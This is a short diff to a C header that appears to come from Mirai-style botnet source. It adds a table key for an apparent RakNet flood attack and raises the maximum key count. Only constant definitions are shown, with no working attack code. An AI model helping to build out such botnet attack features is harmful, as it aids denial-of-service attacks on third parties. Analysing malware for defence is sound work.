@@ -19,9 +19,9 @@ struct table_value {
 #define TABLE_KILLER_PROC       4
 #define TABLE_KILLER_EXE        5
 #define TABLE_KILLER_FD         6
-#define TABLE_MAX_KEYS          19 
-
 #define TABLE_REPORT_IP         18
+#define TABLE_ATK_RAKNET        19  // ADDED - next available number
+#define TABLE_MAX_KEYS          20   // CHANGED from 19 to 20
 
 void table_init(void);
 void table_unlock_val(uint8_t);
